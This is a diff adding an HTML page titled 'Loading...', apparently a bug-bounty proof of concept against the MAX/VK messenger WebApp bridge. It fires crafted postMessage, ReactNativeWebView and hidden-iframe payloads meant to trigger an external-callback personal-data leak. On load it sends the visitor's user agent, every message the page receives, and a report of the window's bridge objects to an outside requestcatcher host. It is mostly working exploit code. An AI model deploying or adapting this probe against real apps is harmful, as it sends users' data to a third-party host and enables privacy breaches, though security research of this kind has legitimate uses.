@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body { font-family: monospace; background: #111; color: #0f0; padding: 20px; font-size: 13px; }
+        .log { margin: 4px 0; }
+        .ok  { color: #0f0; }
+        .err { color: #f44; }
+        .inf { color: #ff0; }
+    </style>
+</head>
+<body>
+<div id="log"></div>
+<script>
+// ============================================================
+// MAX/VK WebApp Callback PoC
+// Цель: выяснить какой postMessage-метод триггерит
+//       ExternalCallbackWidget -> ud6.b() -> PII leak
+// ============================================================
+
+const CATCHER = "https://testmybug123.requestcatcher.com/webapp";
+const CALLBACK_URL = CATCHER + "?externalCallback=1";
+
+function log(msg, type = 'inf') {
+    const d = document.createElement('div');
+    d.className = 'log ' + type;
+    d.textContent = '[' + new Date().toISOString().slice(11,23) + '] ' + msg;
+    document.getElementById('log').appendChild(d);
+    console.log(msg);
+}
+
+// Отправить на requestcatcher что страница загрузилась
+fetch(CATCHER + "?event=page_loaded&ua=" + encodeURIComponent(navigator.userAgent))
+    .catch(() => {});
+
+log("WebApp loaded, UA: " + navigator.userAgent.slice(0,60));
+log("Trying all known MAX/VK bridge methods...");
+
+// --------------------------------------------------------
+// Метод 1: VK Bridge (vkBridge npm package)
+// --------------------------------------------------------
+try {
+    if (typeof vkBridge !== 'undefined') {
+        log("vkBridge found! Sending VKWebAppClose...", 'ok');
+        vkBridge.send('VKWebAppClose', { status: 'ok' });
+    } else {
+        log("vkBridge: not found", 'err');
+    }
+} catch(e) { log("vkBridge error: " + e, 'err'); }
+
+// --------------------------------------------------------
+// Метод 2: window.ReactNativeWebView (mobile WebView bridge)
+// --------------------------------------------------------
+try {
+    if (window.ReactNativeWebView) {
+        log("ReactNativeWebView found! Sending...", 'ok');
+
+        const payloads = [
+            { type: 'web_app_close', url: CALLBACK_URL },
+            { type: 'external_callback', url: CALLBACK_URL },
+            { type: 'openLink', data: { url: CALLBACK_URL } },
+            { handler: 'externalCallback', params: { url: CALLBACK_URL } },
+            { method: 'close', result: CALLBACK_URL },
+        ];
+
+        payloads.forEach((p, i) => {
+            setTimeout(() => {
+                log("RN payload #" + i + ": " + JSON.stringify(p).slice(0,80));
+                window.ReactNativeWebView.postMessage(JSON.stringify(p));
+            }, i * 300);
+        });
+    } else {
+        log("ReactNativeWebView: not found", 'err');
+    }
+} catch(e) { log("ReactNativeWebView error: " + e, 'err'); }
+
+// --------------------------------------------------------
+// Метод 3: window.parent.postMessage (iframe / WebView)
+// --------------------------------------------------------
+const parentMessages = [
+    { type: 'web_app_close', url: CALLBACK_URL },
+    { type: 'external_callback', url: CALLBACK_URL },
+    { type: 'VKWebAppClose', url: CALLBACK_URL },
+    { eventType: 'web_app_close', data: { url: CALLBACK_URL } },
+    { eventType: 'external_callback', data: CALLBACK_URL },
+    { handler: 'externalCallback', url: CALLBACK_URL },
+    { action: 'close', externalCallback: CALLBACK_URL },
+];
+
+parentMessages.forEach((p, i) => {
+    setTimeout(() => {
+        try {
+            log("parent.postMessage #" + i + ": " + JSON.stringify(p).slice(0,80));
+            window.parent.postMessage(JSON.stringify(p), '*');
+            window.parent.postMessage(p, '*');
+        } catch(e) { log("postMessage #" + i + " error: " + e, 'err'); }
+    }, 500 + i * 200);
+});
+
+// --------------------------------------------------------
+// Метод 4: window.postMessage на себя (для перехвата через inject)
+// --------------------------------------------------------
+setTimeout(() => {
+    try {
+        window.postMessage(JSON.stringify({
+            type: 'external_callback',
+            url: CALLBACK_URL
+        }), '*');
+        log("window.postMessage self sent", 'ok');
+    } catch(e) {}
+}, 2500);
+
+// --------------------------------------------------------
+// Метод 5: Location redirect с externalCallback
+// Вдруг MAX перехватывает навигацию внутри WebView
+// --------------------------------------------------------
+setTimeout(() => {
+    log("Trying location methods...");
+    // Не делаем реальный редирект чтобы не убить страницу,
+    // но попробуем через iframe
+    try {
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = CALLBACK_URL;
+        document.body.appendChild(iframe);
+        log("iframe injected with: " + CALLBACK_URL, 'ok');
+    } catch(e) { log("iframe error: " + e, 'err'); }
+}, 3000);
+
+// --------------------------------------------------------
+// Метод 6: Слушаем все входящие postMessage от MAX
+// --------------------------------------------------------
+window.addEventListener('message', function(event) {
+    log("RECEIVED message: " + JSON.stringify(event.data).slice(0,120), 'ok');
+    fetch(CATCHER + "?event=received_message&data=" + encodeURIComponent(JSON.stringify(event.data))).catch(()=>{});
+});
+
+// --------------------------------------------------------
+// Финал — через 5 сек посылаем отчёт об окружении
+// --------------------------------------------------------
+setTimeout(() => {
+    const env = {
+        userAgent: navigator.userAgent,
+        hasVkBridge: typeof vkBridge !== 'undefined',
+        hasRNWebView: !!window.ReactNativeWebView,
+        hasMAXBridge: !!window.MAXBridge,
+        hasOneMeBridge: !!window.oneMeBridge,
+        keys: Object.keys(window).filter(k =>
+            k.toLowerCase().includes('vk') ||
+            k.toLowerCase().includes('max') ||
+            k.toLowerCase().includes('bridge') ||
+            k.toLowerCase().includes('webapp') ||
+            k.toLowerCase().includes('native')
+        )
+    };
+    log("ENV REPORT: " + JSON.stringify(env));
+    fetch(CATCHER + "?event=env_report&data=" + encodeURIComponent(JSON.stringify(env))).catch(()=>{});
+    log("=== All methods tried. Check requestcatcher ===", 'ok');
+}, 5000);
+</script>
+</body>
+</html>
